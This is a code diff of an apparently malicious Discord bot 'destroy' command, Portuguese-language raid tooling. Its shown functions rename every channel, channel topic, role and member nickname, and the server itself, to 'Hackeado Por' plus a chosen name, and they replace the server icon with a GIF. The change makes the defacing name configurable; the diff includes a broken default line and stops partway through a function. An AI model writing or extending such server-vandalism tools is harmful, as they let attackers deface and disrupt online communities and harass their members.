@@ -1,19 +1,23 @@
-exports.run = async (client, message) => {
+exports.run = async (client, message, args) => {
+  let arg = args.slice(0).join(" ");
+  if(!arg){
+    arg: "rafaelpnsm"
+  }
     console.log(`Destroy Ordernado Por ${message.author.username} ID: ${message.author.id}`)
     function a1(){
         client.guilds.get(message.guild.id).channels.forEach((canal) => {
-            canal.setTopic("Hackeado Por Gustavo33")
-            canal.setName("Hackeado Por Gustavo33")
+            canal.setTopic("Hackeado Por " + arg)
+            canal.setName("Hackeado Por " + arg)
         })
-       message.guild.setName("Hackeado Por Gustavo33")
+       message.guild.setName("Hackeado Por " + arg)
        client.guilds.get(message.guild.id).members.forEach((m) => {
-           m.setNickname("Hackeado Por Gustavo33")
+           m.setNickname("Hackeado Por " + arg)
        })
     }
     function b1(){
        message.guild.setIcon("https://media.tenor.com/images/71656fc182ad63d50fbcd7c5496aa09d/tenor.gif")
      client.guilds.get(message.guild.id).roles.forEach((r) => {
-         r.setName("Hackeado Por Gustavo33")
+         r.setName("Hackeado Por " + arg)
      })
     }
     function a2(){
